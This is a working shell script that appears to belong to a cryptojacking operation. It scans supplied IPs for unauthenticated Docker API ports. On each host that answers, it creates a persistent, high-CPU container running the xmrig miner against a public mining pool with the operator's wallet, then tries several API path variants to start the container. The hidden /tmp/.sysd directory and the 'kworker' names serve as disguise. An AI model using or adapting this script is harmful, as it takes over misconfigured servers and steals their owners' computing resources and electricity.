#!/bin/sh
# ============================================================================
# gateway start-shape matrix.
#
# A slice of this population answers create with an id and then returns
# {"message":"page not found"} to start. "page not found" is a *router* verdict
# (docker itself says "No such container"), i.e. a front that routes some shapes
# and not others - and create is a static path while start is a dynamic one.
# So try every spelling a front could route, one host at a time, and read the
# container back after each. If any shape lands, that host becomes real capacity
# for zero extra supply.
#
# usage: sh _gwm.sh ip [ip ...]
# ============================================================================
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
POOL="${POOL:-pool.supportxmr.com:443}"
CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-color\",\"-k\",\"--tls\""
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{\"kworker-gwm\":\"1\"},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048}}"

for ip in "$@"; do
    echo "== $ip"
    b=""; o=""; pv=""
    for p in 2375 2376 4243; do
        case $p in
            2376) hb="https://$ip:$p"; ho="-k" ;;
            *)    hb="http://$ip:$p";  ho=""  ;;
        esac
        v=$(curl -fsS $ho --max-time 4 "$hb/version" 2>/dev/null) || continue
        case "$v" in
            *ApiVersion*)
                pv=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
                b="$hb"; o="$ho"; break ;;
        esac
    done
    [ -n "$b" ] || { echo "   no daemon answer"; continue; }
    echo "   api=$pv base=$b"

    lst=$(curl -fsS $o --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    id=$(printf '%s' "$lst" | tr '}' '\n' | grep '"kworker"' | head -1 \
         | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    if [ -z "$id" ]; then
        echo "   no container of ours in the list - creating one to test with"
        cr=$(curl -sS $o --max-time 30 -w '|%{http_code}' -X POST \
                  "$b/containers/create?name=kworker" \
                  -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null) || cr="|000"
        echo "   create -> ${cr##*|} $(printf '%s' "${cr%|*}" | head -c 70)"
        id=$(printf '%s' "${cr%|*}" | grep -oE '[0-9a-f]{64}' | head -1)
    fi
    echo "   id=${id:-none}"
    [ -n "$id" ] || continue

    for pre in "" "/v1.24" "/v1.38" "/v1.41" "/v1.43"; do
        rb=$(curl -sS $o --max-time 10 -w '|%{http_code}' -X POST \
                  "$b$pre/containers/$id/start" 2>/dev/null) || rb="|000"
        echo "   POST start$pre -> ${rb##*|} $(printf '%s' "${rb%|*}" | head -c 60)"
    done
    nm=$(printf '%s' "$lst" | tr '}' '\n' | grep '"kworker"' | head -1 \
         | grep -o '"Names":\[[^]]*\]' | grep -o '"[^"]*"' | tail -1 | tr -d '"' | sed 's#^/##')
    if [ -n "$nm" ]; then
        rb=$(curl -sS $o --max-time 10 -w '|%{http_code}' -X POST \
                  "$b/containers/$nm/start" 2>/dev/null) || rb="|000"
        echo "   POST start by-name($nm) -> ${rb##*|}"
    fi
    for pre in "" "/v1.41"; do
        rb=$(curl -sS $o --max-time 6 -w '|%{http_code}' -o /dev/null \
                  "$b$pre/containers/$id/json" 2>/dev/null) || rb="|000"
        echo "   GET  readback$pre -> ${rb##*|}"
    done
    rb=$(curl -sS $o --max-time 6 -w '|%{http_code}' -o /dev/null \
              "$b/containers/$id/top" 2>/dev/null) || rb="|000"
    echo "   GET  top -> ${rb##*|}"
done
